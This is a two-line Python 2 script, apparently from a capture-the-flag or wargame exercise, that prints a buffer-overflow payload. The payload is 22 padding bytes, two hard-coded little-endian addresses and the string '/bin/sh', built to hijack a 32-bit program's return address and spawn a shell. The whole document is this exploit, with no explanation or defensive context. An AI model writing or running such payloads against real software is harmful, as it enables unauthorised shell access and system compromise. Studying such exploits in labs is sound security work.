from struct import pack
print "a" * 22 + pack("<I", 0x08048eed) + pack("<I", 0xbffe9cd4) + "/bin/sh"
